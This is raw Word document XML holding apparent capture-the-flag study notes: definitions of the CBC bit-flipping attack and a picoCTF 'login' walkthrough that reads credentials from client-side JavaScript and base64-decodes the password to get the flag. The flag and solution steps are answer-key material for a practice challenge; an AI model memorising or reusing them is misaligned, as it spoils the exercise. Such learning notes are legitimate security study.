    <w:p w14:paraId="66684BC0" w14:textId="4BF8CA89" w:rsidR="00654264" w:rsidRDefault="00000000" w:rsidP="001C530B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId110" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00654264">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://en.wikipedia.org/wiki/Homomorphic_encryption</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="116FCC19" w14:textId="55F77FE4" w:rsidR="00654264" w:rsidRDefault="00654264"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search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6085DE82" w14:textId="1CFF8250"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CBC bit flipping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1136EEF6" w14:textId="037A1A2E"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E4AFCC5" w14:textId="1DD01C43"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3D8F235" w14:textId="71A1F629"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0D65A8">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>A bit-flipping attack</w:t>
      </w:r>
      <w:r w:rsidRPr="000D65A8">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an attack on a cryptographic cipher in which the attacker can change the ciphertext in such a way as to result in a predictable change of the plaintext, although the attacker is not able to learn the plaintext itself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1680C2BB" w14:textId="64BB2B64"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7B7C82A7" w14:textId="77777777" w:rsidR="000D65A8" w:rsidRDefault="000D65A8"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6FB0A35E" w14:textId="66784BC6"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54FA189D" w14:textId="113A710B"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Cipher Block Chaining (CBC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A884CE" w14:textId="594D9ADA" w:rsidR="006F0F0E" w:rsidRPr="006F0F0E" w:rsidRDefault="006F0F0E" w:rsidP="006F0F0E">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>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Block ciphers such as AES encrypt blocks of text at a time, rather than encrypting one bit at a time as in stream ciphers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFFEA3C" w14:textId="4F11AE4C" w:rsidR="006F0F0E" w:rsidRDefault="006F0F0E"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sidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>In the Cipher Block Chaining (CBC) mode of operation, each plaintext block is XORed with the previous ciphertext block before being encrypted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74586941" w14:textId="45DBB819"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CB0049A" wp14:editId="77AD63E1">
            <wp:extent cx="5724525" cy="2305050"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5724525" cy="2305050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19326AB4" w14:textId="3E344A24"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p>
    <w:p w14:paraId="770D1D3E" w14:textId="1F15BF3A" w:rsidR="000F6870" w:rsidRDefault="000F6870"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="474D2428" wp14:editId="7570E7CC">
            <wp:extent cx="4595258" cy="5524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5258" cy="5524979"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2055DC14" w14:textId="01E41C08" w:rsidR="0018076A" w:rsidRPr="006F0F0E" w:rsidRDefault="0018076A" w:rsidP="006F0F0E">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27141B6A" wp14:editId="496C6BB1">
            <wp:extent cx="4412362" cy="2796782"/>
            <wp:effectExtent l="0" t="0" r="7620"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13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4412362" cy="2796782"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="636D4DE1" w14:textId="77777777"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p>
    <w:p w14:paraId="048154ED" w14:textId="63C5C1EA" w:rsidR="006F0F0E" w:rsidRDefault="006F0F0E" w:rsidP="001C530B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>arbitrarily change the value of the decoded plaintext in a CBC block cipher.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5426898B" w14:textId="634EC91A" w:rsidR="00654264"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The bit-flipping attack is a method of an attack which can change specific fields on ciphertext without decryption of the ciphertext [5]. The bit-flipping attack is feasible in specific encryption modes where a plaintext has same bit order with a ciphertext [3].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6B6B72" w14:textId="296FFC0E" w:rsidR="006F0F0E" w:rsidRDefault="006F0F0E" w:rsidP="001C530B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Stream ciphers, such as RC4, are vulnerable to a bit-flipping attack, as are some block cipher modes of operation. See stream cipher attack. A keyed message authentication code, digital signature, or other authentication mechanism allows the recipient to detect if any bits were flipped in transit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C0D730" w14:textId="77777777"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p>
    <w:p w14:paraId="76211DDD" w14:textId="249B67C0" w:rsidR="00654264" w:rsidRDefault="00654264" w:rsidP="001C530B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00654264">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>ZzJwTW1SNTRNMFE5OGJ5NlZOU2o5NEo3U0U5VERzM0JzbEZ5WGlpaURVeUoyek9mMU1Wd1gyMFdsQXRVa0lqaWowSE0wRU15QXEvdzk0Wi9QNEIxcm5HYkJoM25FNi9ZYk1GUU5XRmpSZDNGREFRK2VQeGxoOHI3b1hjd0tCaGc=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E41CD89" w14:textId="2D1B644E" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EE3D842" w14:textId="55EC203C" w:rsidR="00484771" w:rsidRDefault="00484771" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E9D89D8" w14:textId="77777777" w:rsidR="00484771" w:rsidRDefault="00484771" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66A74467" w14:textId="39F80C9E" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BE46B84" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795CD624" w14:textId="27D4A7DB" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 100 points</w:t>
      </w:r>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FDA702" w14:textId="79901724" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01FCBB8A" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B35F5E" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>AUTHOR: BROWNIEINMOTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175E88DF" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20B596D3" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7167DEE3" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>My dog-sitter's brother made this website but I can't get in; can you help?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C08E422" w14:textId="38DE9A2F" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>login.mars.picoctf.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F62F79C" w14:textId="177B8F6E" w:rsidR="001C530B" w:rsidRDefault="004C3213" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>orce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42986390" w14:textId="7A6D1A0D" w:rsidR="00233019" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="468D70EA" wp14:editId="3B319527">
            <wp:extent cx="3360711" cy="2339543"/>
            <wp:effectExtent l="0" t="0" r="0" b="381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14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3360711" cy="2339543"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DF03C4" w14:textId="30AF75F0" w:rsidR="00233019" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ndex.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A729D49" wp14:editId="56E38442">
            <wp:extent cx="6332220" cy="667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667385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ED27CB" w14:textId="77777777" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">opy index.js to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>vscode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ormat index.js  with -&gt;prettier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="093B280E" wp14:editId="110C3ACD">
            <wp:extent cx="633222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2995295"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA445D5" w14:textId="12DDC577" w:rsidR="004C3213" w:rsidRPr="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>We found username : YWRtaW4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7517F024" w14:textId="77777777" w:rsidR="004C3213" w:rsidRPr="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Password: cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D804204" w14:textId="2867EC58" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>and the flag is the password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7C47D8" w14:textId="3833E2F1" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>btoa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>() encode to base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B961170" w14:textId="7D284FA4" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>atob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>() decode base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D7FE20" w14:textId="5049FA47" w:rsidR="004C3213" w:rsidRDefault="000B5615" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>atob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613D2A94" w14:textId="27584CF9" w:rsidR="001C530B" w:rsidRDefault="000B5615" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
